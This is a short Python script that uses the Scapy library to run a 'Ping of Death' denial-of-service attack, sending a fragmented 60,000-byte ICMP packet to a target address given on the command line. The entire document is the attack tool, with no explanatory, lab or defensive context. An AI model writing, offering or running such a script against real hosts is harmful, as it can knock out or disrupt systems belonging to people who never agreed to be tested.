import sys

from scapy.all import *

def PingofDeath(tarket):
	send( fragment(IP(dst=tarket)/ICMP()/("X"*60000)) ) 
if __name__ == "__main__":
	target = sys.argv[1]
	PingofDeath(target)
